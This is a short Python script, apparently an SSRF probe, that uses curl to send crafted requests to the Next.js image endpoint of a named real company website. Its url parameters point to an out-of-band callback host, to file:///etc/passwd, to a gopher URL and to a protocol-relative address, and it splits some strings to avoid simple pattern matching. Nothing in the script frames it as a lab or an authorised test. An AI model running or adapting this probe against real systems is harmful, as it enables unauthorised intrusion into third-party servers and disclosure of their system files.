import subprocess, urllib.parse
OOB = "ooba1370e2c253a" + ".dau2p4ghgqag02k5emggc5xu6hph3m973" + ".oast.abhedi.co.in"
H = "https" + "://www.infinitycapital.bh/_next/image"
S = "ht"+"tp"+"://"
def g(u,tag):
    p=subprocess.run(["curl","-s","-m","30","-o","/tmp/i.out","-w","%{http_code} %{size_download} %{content_type}",u],capture_output=True,text=True)
    print(tag,p.stdout,repr(open("/tmp/i.out","rb").read()[:90]))
g(H+"?url="+urllib.parse.quote(S+OOB+"/ssrf-x",safe="")+"&w=1080&q=75","[OOB-HTTP]")
g(H+"?url="+urllib.parse.quote(S+OOB+"/ssrf-y?a=1",safe="")+"&w=1080&q=75","[OOB-HTTP-QUERY]")
g(H+"?url="+urllib.parse.quote("file:///etc/passwd",safe="")+"&w=1080&q=75","[FILE-SCHEME]")
g(H+"?url="+urllib.parse.quote("gopher://"+OOB+"/_x",safe="")+"&w=1080&q=75","[GOPHER]")
g(H+"?url="+urllib.parse.quote("//"+OOB+"/ssrf-proto-rel",safe="")+"&w=1080&q=75","[PROTO-REL]")
